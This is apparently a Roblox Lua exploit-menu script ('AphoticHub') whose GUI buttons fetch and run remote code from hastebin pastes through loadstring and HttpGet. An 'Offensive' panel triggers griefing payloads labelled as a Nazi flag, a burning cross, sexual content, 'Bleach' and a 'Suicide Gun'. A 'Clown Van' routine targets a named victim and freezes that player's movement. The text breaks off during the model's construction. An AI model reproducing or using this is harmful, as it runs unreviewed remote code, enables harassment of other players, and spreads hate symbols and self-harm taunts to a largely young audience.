local AphoticHub = Instance.new("ScreenGui")
BabyTitan.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BabyTitan.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BabyTitan.Position = UDim2.new(0.0215946734, 0, 0.294736832, 0)
BabyTitan.Size = UDim2.new(0, 94, 0, 20)
BabyTitan.Font = Enum.Font.SourceSans
BabyTitan.Text = "Baby"
BabyTitan.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BabyTitan.TextSize = 14
BabyTitan.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/sunidimiru.vbs'),true))()
end)

RedTitan.Name = "RedTitan"
RedTitan.Parent = TitanFrame
RedTitan.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
RedTitan.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
RedTitan.Position = UDim2.new(0.0215946734, 0, 0.442105263, 0)
RedTitan.Size = UDim2.new(0, 94, 0, 20)
RedTitan.Font = Enum.Font.SourceSans
RedTitan.Text = "Red"
RedTitan.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
RedTitan.TextSize = 14
RedTitan.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/pimusifavi.lua'),true))()
end)

TITAN.Name = "TITAN"
TITAN.Parent = TitanFrame
TITAN.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
TITAN.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
TITAN.Position = UDim2.new(0.0215946734, 0, 0.573684216, 0)
TITAN.Size = UDim2.new(0, 94, 0, 20)
TITAN.Font = Enum.Font.SourceSans
TITAN.Text = "TITAN"
TITAN.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
TITAN.TextSize = 14
TITAN.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/uqoyuvixaq.lua'),true))()
end)

BladedDarkTitan.Name = "BladedDarkTitan"
BladedDarkTitan.Parent = TitanFrame
BladedDarkTitan.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BladedDarkTitan.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BladedDarkTitan.Position = UDim2.new(0.0215946734, 0, 0.710526288, 0)
BladedDarkTitan.Size = UDim2.new(0, 94, 0, 20)
BladedDarkTitan.Font = Enum.Font.SourceSans
BladedDarkTitan.Text = "Bladed Dark"
BladedDarkTitan.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BladedDarkTitan.TextSize = 14
BladedDarkTitan.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/imikatukaq.lua'),true))()
end)

ArlisTitan.Name = "ArlisTitan"
ArlisTitan.Parent = TitanFrame
ArlisTitan.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ArlisTitan.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ArlisTitan.Position = UDim2.new(0.0215946734, 0, 0.852631569, 0)
ArlisTitan.Size = UDim2.new(0, 94, 0, 20)
ArlisTitan.Font = Enum.Font.SourceSans
ArlisTitan.Text = "Arlis"
ArlisTitan.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ArlisTitan.TextSize = 14
ArlisTitan.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/eweqekahup.lua'),true))()
end)

OffensiveFrame.Name = "OffensiveFrame"
OffensiveFrame.Parent = Mainframe
OffensiveFrame.BackgroundColor3 = Color3.new(0, 0, 0)
OffensiveFrame.BorderColor3 = Color3.new(1, 1, 1)
OffensiveFrame.Position = UDim2.new(0, 0, -0.00263154507, 0)
OffensiveFrame.Size = UDim2.new(0, 301, 0, 190)
OffensiveFrame.Visible = false

NaziFlag.Name = "NaziFlag"
NaziFlag.Parent = OffensiveFrame
NaziFlag.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
NaziFlag.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
NaziFlag.Position = UDim2.new(0.0210210215, 0, 0.0609810725, 0)
NaziFlag.Size = UDim2.new(0, 89, 0, 20)
NaziFlag.Font = Enum.Font.SourceSans
NaziFlag.Text = "Nazi Flag"
NaziFlag.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
NaziFlag.TextSize = 14
NaziFlag.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/detetorujo.php'),true))()
end)

BurningCross.Name = "BurningCross"
BurningCross.Parent = OffensiveFrame
BurningCross.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BurningCross.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BurningCross.Position = UDim2.new(0.0210210085, 0, 0.19036895, 0)
BurningCross.Size = UDim2.new(0, 89, 0, 20)
BurningCross.Font = Enum.Font.SourceSans
BurningCross.Text = "Burning Cross"
BurningCross.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BurningCross.TextSize = 14
BurningCross.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/qocacayome.go'),true))()
end)

TitsAndAss.Name = "TitsAndAss"
TitsAndAss.Parent = OffensiveFrame
TitsAndAss.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
TitsAndAss.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
TitsAndAss.Position = UDim2.new(0.0210210085, 0, 0.319756985, 0)
TitsAndAss.Size = UDim2.new(0, 89, 0, 20)
TitsAndAss.Font = Enum.Font.SourceSans
TitsAndAss.Text = "Tits And Ass"
TitsAndAss.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
TitsAndAss.TextSize = 14
TitsAndAss.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ehoxepadah.coffeescript'),true))()
end)

DickAll.Name = "DickAll"
DickAll.Parent = OffensiveFrame
DickAll.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
DickAll.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
DickAll.Position = UDim2.new(0.0210210085, 0, 0.4491449, 0)
DickAll.Size = UDim2.new(0, 89, 0, 20)
DickAll.Font = Enum.Font.SourceSans
DickAll.Text = "Dick All"
DickAll.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
DickAll.TextSize = 14
DickAll.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/xekexuxone.vbs'),true))()
end)

Bleach.Name = "Bleach"
Bleach.Parent = OffensiveFrame
Bleach.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Bleach.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Bleach.Position = UDim2.new(0.0210210085, 0, 0.578532934, 0)
Bleach.Size = UDim2.new(0, 89, 0, 20)
Bleach.Font = Enum.Font.SourceSans
Bleach.Text = "Bleach"
Bleach.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Bleach.TextSize = 14
Bleach.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ocedabusif.cpp'),true))()
end)

AllahAkbar.Name = "AllahAkbar"
AllahAkbar.Parent = OffensiveFrame
AllahAkbar.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
AllahAkbar.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
AllahAkbar.Position = UDim2.new(0.312312305, 0, 0.579369009, 0)
AllahAkbar.Size = UDim2.new(0, 89, 0, 20)
AllahAkbar.Font = Enum.Font.SourceSans
AllahAkbar.Text = "Allah Akbar"
AllahAkbar.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
AllahAkbar.TextSize = 14
AllahAkbar.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet(('https://hastebin.com/raw/akiwegofib.lua'),true))()
end)

SuicideGun.Name = "SuicideGun"
SuicideGun.Parent = OffensiveFrame
SuicideGun.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
SuicideGun.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
SuicideGun.Position = UDim2.new(0.171171159, 0, 0.713546336, 0)
SuicideGun.Size = UDim2.new(0, 89, 0, 20)
SuicideGun.Font = Enum.Font.SourceSans
SuicideGun.Text = "Suicide Gun"
SuicideGun.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
SuicideGun.TextSize = 14
SuicideGun.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/akiwegofib.lua'),true))()
end)

ClownVan.Name = "ClownVan"
ClownVan.Parent = OffensiveFrame
ClownVan.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
ClownVan.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
ClownVan.Position = UDim2.new(0.312312305, 0, 0.4491449, 0)
ClownVan.Size = UDim2.new(0, 89, 0, 20)
ClownVan.Font = Enum.Font.SourceSans
ClownVan.Text = "Clown Van"
ClownVan.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ClownVan.TextSize = 14
ClownVan.MouseButton1Click:Connect(function()
	Victim = (OffensiveTextBox.Text)
o1 = Instance.new("Model")
o2 = Instance.new("Part")
o3 = Instance.new("CylinderMesh")
o4 = Instance.new("Part")
o5 = Instance.new("SpecialMesh")
o6 = Instance.new("Part")
o7 = Instance.new("SpecialMesh")
o8 = Instance.new("Part")
o9 = Instance.new("BlockMesh")
o10 = Instance.new("Part")
o11 = Instance.new("BlockMesh")
o12 = Instance.new("Part")
o13 = Instance.new("Part")
o14 = Instance.new("BlockMesh")
o15 = Instance.new("Part")
o16 = Instance.new("SpecialMesh")
o17 = Instance.new("Part")
o18 = Instance.new("SpecialMesh")
o19 = Instance.new("Part")
o20 = Instance.new("SpecialMesh")
o21 = Instance.new("Sound")
o22 = Instance.new("Part")
o23 = Instance.new("BlockMesh")
o24 = Instance.new("Part")
o25 = Instance.new("SpecialMesh")
o26 = Instance.new("Part")
o27 = Instance.new("BlockMesh")
o28 = Instance.new("Part")
o29 = Instance.new("SpecialMesh")
o30 = Instance.new("Part")
o31 = Instance.new("BlockMesh")
o32 = Instance.new("Part")
o33 = Instance.new("BlockMesh")
o34 = Instance.new("Part")
o35 = Instance.new("BlockMesh")
o36 = Instance.new("Part")
o37 = Instance.new("BlockMesh")
o38 = Instance.new("Part")
o39 = Instance.new("Part")
o40 = Instance.new("BlockMesh")
o41 = Instance.new("Part")
o42 = Instance.new("BlockMesh")
o43 = Instance.new("Part")
o44 = Instance.new("BlockMesh")
o45 = Instance.new("Part")
o46 = Instance.new("SpecialMesh")
o47 = Instance.new("Part")
o48 = Instance.new("BlockMesh")
o49 = Instance.new("Part")
o50 = Instance.new("BlockMesh")
o51 = Instance.new("Part")
o52 = Instance.new("BlockMesh")
o53 = Instance.new("Part")
o54 = Instance.new("SpecialMesh")
o55 = Instance.new("Part")
o56 = Instance.new("SpecialMesh")
o57 = Instance.new("Part")
o58 = Instance.new("BlockMesh")
o59 = Instance.new("Part")
o60 = Instance.new("BlockMesh")
o61 = Instance.new("Part")
o62 = Instance.new("BlockMesh")
o63 = Instance.new("Part")
o64 = Instance.new("Part")
o65 = Instance.new("Part")
o66 = Instance.new("BlockMesh")
o67 = Instance.new("Part")
o68 = Instance.new("BlockMesh")
o69 = Instance.new("Part")
o70 = Instance.new("BlockMesh")
o71 = Instance.new("Part")
o72 = Instance.new("BlockMesh")
o73 = Instance.new("Part")
o74 = Instance.new("SpecialMesh")
o75 = Instance.new("Decal")
o76 = Instance.new("Part")
o77 = Instance.new("Part")
o78 = Instance.new("BlockMesh")
o79 = Instance.new("Part")
o80 = Instance.new("SpecialMesh")
o81 = Instance.new("Decal")
o82 = Instance.new("Part")
o83 = Instance.new("SpecialMesh")
o84 = Instance.new("Humanoid")
o85 = Instance.new("Part")
o86 = Instance.new("Part")
o87 = Instance.new("Part")
o88 = Instance.new("Decal")
o89 = Instance.new("Motor6D")
o90 = Instance.new("Motor6D")
o91 = Instance.new("Motor6D")
o92 = Instance.new("Motor6D")
o93 = Instance.new("Motor6D")
o94 = Instance.new("Part")
o95 = Instance.new("Part")
o96 = Instance.new("Part")
o97 = Instance.new("Part")
o98 = Instance.new("Part")
o99 = Instance.new("Decal")
o100 = Instance.new("Motor6D")
o101 = Instance.new("Motor6D")
o102 = Instance.new("Motor6D")
o103 = Instance.new("Part")
o104 = Instance.new("Part")
o105 = Instance.new("Part")
o106 = Instance.new("Part")
o107 = Instance.new("Part")
o108 = Instance.new("CylinderMesh")
o109 = Instance.new("Part")
o110 = Instance.new("CylinderMesh")
o111 = Instance.new("Part")
o112 = Instance.new("CylinderMesh")
o113 = Instance.new("Part")
o114 = Instance.new("CylinderMesh")
o115 = Instance.new("Part")
o116 = Instance.new("CylinderMesh")
o117 = Instance.new("Part")
o118 = Instance.new("CylinderMesh")
o119 = Instance.new("Part")
o120 = Instance.new("CylinderMesh")
o121 = Instance.new("Part")
o122 = Instance.new("SpecialMesh")
o123 = Instance.new("Part")
o1.Name = " "
o1.Parent = workspace
o2.Parent = o1
o2.Position = Vector3.new(95.3486252, 1.50001001, 18.4564877)
o2.Rotation = Vector3.new(-90, 1.20620803e-006, -180)
o2.Anchored = true
o2.FormFactor = Enum.FormFactor.Symmetric
o2.Size = Vector3.new(2.39999986, 1.31000006, 2.39999986)
o2.CFrame = CFrame.new(95.3486252, 1.50001001, 18.4564877, -1, 2.98044895e-008, 2.10523012e-008, 2.10523012e-008, 7.54615499e-008, 1, 2.9804486e-008, 1, -7.54615499e-008)
o3.Parent = o2
o4.Parent = o1
o4.BrickColor = BrickColor.new("Institutional white")
o4.Position = Vector3.new(96.3181839, 7.00000668, 9.31151104)
o4.Rotation = Vector3.new(90, 89.9314728, -90)
o4.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o4.Velocity = Vector3.new(-0.000346515269, 0.00201798417, -0.00195027643)
o4.Anchored = true
o4.FormFactor = Enum.FormFactor.Plate
o4.Size = Vector3.new(1, 2.4000001, 2)
o4.CFrame = CFrame.new(96.3181839, 7.00000668, 9.31151104, 0, 3.96052044e-008, 0.999999285, 0, 1, -3.97634246e-008, -1, 0, 0)
o4.BackSurface = Enum.SurfaceType.Weld
o4.BottomSurface = Enum.SurfaceType.Weld
o4.LeftSurface = Enum.SurfaceType.Weld
o4.TopSurface = Enum.SurfaceType.Weld
o4.Color = Color3.new(0.972549, 0.972549, 0.972549)
o5.Parent = o4
o5.MeshType = Enum.MeshType.Wedge
o6.Parent = o1
o6.Material = Enum.Material.SmoothPlastic
o6.BrickColor = BrickColor.new("Really black")
o6.Transparency = 0.5
o6.Position = Vector3.new(96.3181839, 7.00000668, 13.8115101)
o6.Rotation = Vector3.new(90, 89.9440536, -90)
o6.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o6.Velocity = Vector3.new(0.000965324172, 0.00135755131, -0.00195027643)
o6.Anchored = true
o6.FormFactor = Enum.FormFactor.Plate
o6.Size = Vector3.new(8, 2.4000001, 1.99999976)
o6.CFrame = CFrame.new(96.3181839, 7.00000668, 13.8115101, 0, 3.96315798e-008, 0.999999523, 0, 1, -3.97370599e-008, -1, 0, 0)
o6.BackSurface = Enum.SurfaceType.Weld
o6.BottomSurface = Enum.SurfaceType.Weld
o6.LeftSurface = Enum.SurfaceType.Weld
o6.RightSurface = Enum.SurfaceType.Weld
o6.TopSurface = Enum.SurfaceType.Weld
o6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o7.Parent = o6
o7.MeshType = Enum.MeshType.Wedge
o8.Parent = o1
o8.BrickColor = BrickColor.new("Br. yellowish orange")
o8.Position = Vector3.new(92.2182083, 4.00000715, 9.61151409)
o8.Rotation = Vector3.new(-0, 0, -2.26619136e-006)
o8.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o8.Velocity = Vector3.new(-0.000475873821, 0.00227026758, -0.00119533995)
o8.Anchored = true
o8.FormFactor = Enum.FormFactor.Custom
o8.Size = Vector3.new(0.200000003, 0.800000012, 0.799999714)
o8.CFrame = CFrame.new(92.2182083, 4.00000715, 9.61151409, 0.999998808, 3.95524538e-008, 0, -3.98161575e-008, 1, 0, 0, 0, 1)
o8.BackSurface = Enum.SurfaceType.Weld
o8.BottomSurface = Enum.SurfaceType.Weld
o8.FrontSurface = Enum.SurfaceType.Weld
o8.LeftSurface = Enum.SurfaceType.Weld
o8.RightSurface = Enum.SurfaceType.Weld
o8.TopSurface = Enum.SurfaceType.Weld
o8.Color = Color3.new(0.886275, 0.607843, 0.25098)
o9.Parent = o8
o10.Parent = o1
o10.BrickColor = BrickColor.new("Institutional white")
o10.Position = Vector3.new(105.317894, 8.40004158, 9.31151295)
o10.Rotation = Vector3.new(-0, 0, -2.21330401e-006)
o10.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o10.Velocity = Vector3.new(-0.000245332019, 0.00136755884, -0.00436839834)
o10.Anchored = true
o10.CanCollide = false
game.Players[Victim].Character.Humanoid.WalkSpeed = 0
game.Players[Victim].Character.Humanoid.JumpPower = 0
o10.FormFactor = Enum.FormFactor.Plate
o10.Size = Vector3.new(14, 0.400000006, 1)
o10.CFrame = CFrame.new(105.317894, 8.40004158, 9.31151295, 0.999999762, 3.86294303e-008, 0, -3.86821704e-008, 1, 0, 0, 0, 1)
o10.BackSurface = Enum.SurfaceType.Weld
o10.BottomSurface = Enum.SurfaceType.Weld
o10.FrontSurface = Enum.SurfaceType.Weld
o10.LeftSurface = Enum.SurfaceType.Weld
o10.RightSurface = Enum.SurfaceType.Weld
o10.TopSurface = Enum.SurfaceType.Weld
o10.Color = Color3.new(0.972549, 0.972549, 0.972549)
o11.Parent = o10
o12.Name = "DOOR"
o12.Parent = o1
o12.BrickColor = BrickColor.new("Institutional white")
o12.Position = Vector3.new(103.708466, 5.81500626, 9.31151104)
o12.Rotation = Vector3.new(-0, 0, -4.43210411e-006)
o12.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o12.Velocity = Vector3.new(-0.000432157307, 0.00148387556, -0.00427860441)
o12.Anchored = true
o12.CanCollide = false
o12.FormFactor = Enum.FormFactor.Plate
o12.Size = Vector3.new(5.22000027, 4.82999992, 1)
o12.CFrame = CFrame.new(103.708466, 5.81500626, 9.31151104, 1, 7.73548052e-008, 0, -7.73548052e-008, 1, 0, 0, 0, 1)
o12.BottomSurface = Enum.SurfaceType.Weld
o12.LeftSurface = Enum.SurfaceType.Weld
o12.RightSurface = Enum.SurfaceType.Weld
o12.TopSurface = Enum.SurfaceType.Weld
o12.Color = Color3.new(0.972549, 0.972549, 0.972549)
o13.Parent = o1
o13.BrickColor = BrickColor.new("White")
o13.Position = Vector3.new(109.818169, 5.80000877, 9.31151104)
o13.Rotation = Vector3.new(-0, 0, -2.25410599e-006)
o13.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o13.Velocity = Vector3.new(-0.00043324125, 0.00104231632, -0.006061906)
o13.Anchored = true
o13.FormFactor = Enum.FormFactor.Plate
o13.Size = Vector3.new(7, 4.80000019, 1)
o13.CFrame = CFrame.new(109.818169, 5.80000877, 9.31151104, 0.999996901, 3.9341451e-008, 0, -4.00270856e-008, 1, 0, 0, 0, 1)
o13.BackSurface = Enum.SurfaceType.Weld
o13.BottomSurface = Enum.SurfaceType.Weld
o13.FrontSurface = Enum.SurfaceType.Weld
o13.LeftSurface = Enum.SurfaceType.Weld
o13.RightSurface = Enum.SurfaceType.Weld
o13.TopSurface = Enum.SurfaceType.Weld
o13.Color = Color3.new(0.94902, 0.952941, 0.952941)
o14.Parent = o13
o15.Parent = o1
o15.BrickColor = BrickColor.new("Institutional white")
o15.Position = Vector3.new(97.817894, 8.40000725, 13.8115139)
o15.Rotation = Vector3.new(90, 89.960434, -90)
o15.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o15.Velocity = Vector3.new(0.00106650498, 0.00124916411, -0.00218200427)
o15.Anchored = true
o15.CanCollide = false
o15.FormFactor = Enum.FormFactor.Plate
o15.Size = Vector3.new(10, 0.400000006, 1)
o15.CFrame = CFrame.new(97.817894, 8.40000725, 13.8115139, 0, 3.86294303e-008, 0.999999762, 0, 1, -3.86821704e-008, -1, 0, 0)
o15.BackSurface = Enum.SurfaceType.Weld
o15.BottomSurface = Enum.SurfaceType.Weld
o15.TopSurface = Enum.SurfaceType.Weld
o15.Color = Color3.new(0.972549, 0.972549, 0.972549)
o16.Parent = o15
o16.MeshType = Enum.MeshType.Wedge
o17.Parent = o1
o17.BrickColor = BrickColor.new("Institutional white")
o17.Position = Vector3.new(96.3181839, 7.00000668, 18.3115101)
o17.Rotation = Vector3.new(90, 89.9314728, -90)
o17.RotVelocity = Vector3.new(0.000146762875, 0.000291519886, -7.22717741e-005)
o17.Velocity = Vector3.new(0.00227716356, 0.000697118347, -0.00195027643)
o17.Anchored = true
o17.FormFactor = Enum.FormFactor.Plate
o17.Size = Vector3.new(1, 2.4000001, 2)
o17.CFrame = CFrame.new(96.3181839, 7.00000668, 18.3115101, 0, 3.96052044e-008, 0.999999285, 0, 1, -3.97634246e-008, -1, 0, 0)
o17.BackSurface = Enum.SurfaceType.Weld
o17.BottomSurface = Enum.SurfaceType.Weld
o17.RightSurface = Enum.SurfaceType.Weld
o17.TopSurface = Enum.SurfaceType.Weld
o17.Color = Color3.new(0.972549, 0.972549, 0.972549)
o18.Parent = o17
o18.MeshType = Enum.MeshType.Wedge
